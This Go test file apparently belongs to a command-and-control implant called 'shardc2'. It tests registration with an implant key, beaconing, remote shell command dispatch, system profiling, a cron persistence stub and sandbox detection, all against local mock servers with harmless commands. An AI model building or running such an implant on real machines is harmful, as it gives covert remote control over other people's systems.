package agent

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"
)

func newTestAgent(serverURL string) *Agent {
	cfg := Config{
		ServerURL:  serverURL,
		ImplantKey: "test-key",
		Interval:   1 * time.Second,
		Jitter:     0,
	}
	return New(cfg)
}

func TestRegister(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/v1/agent/register" {
			w.WriteHeader(404)
			return
		}
		if r.Method != "POST" {
			w.WriteHeader(405)
			return
		}
		if r.Header.Get("X-Implant-Key") != "test-key" {
			w.WriteHeader(403)
			return
		}

		body, _ := io.ReadAll(r.Body)
		var data map[string]interface{}
		json.Unmarshal(body, &data)

		if data["hostname"] == "" {
			t.Error("Expected hostname to be set")
		}

		w.WriteHeader(201)
		json.NewEncoder(w).Encode(map[string]string{
			"id":            "bot-123",
			"session_token": "token-abc",
		})
	}))
	defer server.Close()

	a := newTestAgent(server.URL)
	a.profile = &SystemProfile{Hostname: "test-host", OS: "linux", Arch: "amd64", User: "testuser"}

	err := a.Register(context.Background())
	if err != nil {
		t.Fatalf("Expected registration to succeed: %v", err)
	}
	if a.BotID != "bot-123" {
		t.Errorf("Expected bot ID bot-123, got %s", a.BotID)
	}
	if a.sessionToken != "token-abc" {
		t.Errorf("Expected session token token-abc, got %s", a.sessionToken)
	}
}

func TestBeacon(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/v1/agent/beacon" {
			w.WriteHeader(404)
			return
		}
		if r.Header.Get("X-Session-Token") != "test-token" {
			w.WriteHeader(403)
			return
		}
		w.WriteHeader(200)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"status":           "ok",
			"pending_commands": 2,
		})
	}))
	defer server.Close()

	a := newTestAgent(server.URL)
	a.sessionToken = "test-token"

	result, err := a.Beacon(context.Background())
	if err != nil {
		t.Fatalf("Expected beacon to succeed: %v", err)
	}
	if result.PendingCommands != 2 {
		t.Errorf("Expected 2 pending commands, got %d", result.PendingCommands)
	}
}

func TestBeaconNetworkFailure(t *testing.T) {
	a := newTestAgent("http://invalid.url.that.does.not.exist")
	a.sessionToken = "test-token"

	_, err := a.Beacon(context.Background())
	if err == nil {
		t.Fatal("Expected beacon to fail with invalid URL")
	}
}

func TestBeaconServerError(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer server.Close()

	a := newTestAgent(server.URL)
	a.sessionToken = "test-token"

	_, err := a.Beacon(context.Background())
	if err == nil {
		t.Fatal("Expected beacon to fail with 500 status")
	}
}

func TestExecuteCommand(t *testing.T) {
	a := newTestAgent("http://localhost")
	result, err := a.ExecuteCommand(context.Background(), "echo hello")
	if err != nil {
		t.Fatalf("Expected command to execute: %v", err)
	}
	if strings.TrimSpace(result) != "hello" {
		t.Errorf("Expected 'hello', got %q", result)
	}
}

func TestExecuteCommandWithPipes(t *testing.T) {
	a := newTestAgent("http://localhost")
	result, err := a.ExecuteCommand(context.Background(), "echo 'hello world' | wc -w")
	if err != nil {
		t.Fatalf("Expected command to execute: %v", err)
	}
	if strings.TrimSpace(result) != "2" {
		t.Errorf("Expected '2', got %q", result)
	}
}

func TestExecuteCommandEmpty(t *testing.T) {
	a := newTestAgent("http://localhost")
	_, err := a.ExecuteCommand(context.Background(), "")
	if err == nil {
		t.Fatal("Expected empty command to fail")
	}
}

func TestProfileSystem(t *testing.T) {
	a := newTestAgent("http://localhost")
	profile, err := a.ProfileSystem()
	if err != nil {
		t.Fatalf("Expected profiling to succeed: %v", err)
	}
	if profile.Hostname == "" {
		t.Error("Expected hostname to be set")
	}
	if profile.OS == "" {
		t.Error("Expected OS to be set")
	}
	if profile.Arch == "" {
		t.Error("Expected Arch to be set")
	}

	t.Run("default user", func(t *testing.T) {
		originalUser := os.Getenv("USER")
		defer func() {
			if originalUser != "" {
				os.Setenv("USER", originalUser)
			} else {
				os.Unsetenv("USER")
			}
		}()
		os.Unsetenv("USER")
		profile2, err := a.ProfileSystem()
		if err != nil {
			t.Fatalf("Expected profiling to succeed: %v", err)
		}
		if profile2.User != "unknown" {
			t.Errorf("Expected user to be 'unknown', got %q", profile2.User)
		}
	})
}

func TestDispatchCommand(t *testing.T) {
	a := newTestAgent("http://localhost")

	t.Run("shell", func(t *testing.T) {
		out, err := a.DispatchCommand(context.Background(), serverCommand{Type: "shell", Payload: "echo test"})
		if err != nil {
			t.Fatalf("shell command failed: %v", err)
		}
		if strings.TrimSpace(out) != "test" {
			t.Errorf("Expected 'test', got %q", out)
		}
	})

	t.Run("sleep", func(t *testing.T) {
		out, err := a.DispatchCommand(context.Background(), serverCommand{Type: "sleep", Payload: `{"interval":10,"jitter":5}`})
		if err != nil {
			t.Fatalf("sleep command failed: %v", err)
		}
		if !strings.Contains(out, "10s") {
			t.Errorf("Expected interval update in output, got %q", out)
		}
	})

	t.Run("unknown", func(t *testing.T) {
		_, err := a.DispatchCommand(context.Background(), serverCommand{Type: "invalid"})
		if err == nil {
			t.Fatal("Expected unknown command type to fail")
		}
	})
}

func TestInstallPersistence(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "shardc2-test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	origCronDir := "/etc/cron.d"
	_ = origCronDir // cron persistence needs root or custom dir, tested separately
}

func TestCheckSandbox(t *testing.T) {
	indicators := CheckSandbox()
	if indicators == nil {
		t.Fatal("Expected non-nil sandbox indicators")
	}
	// Just verify it runs without panic
}
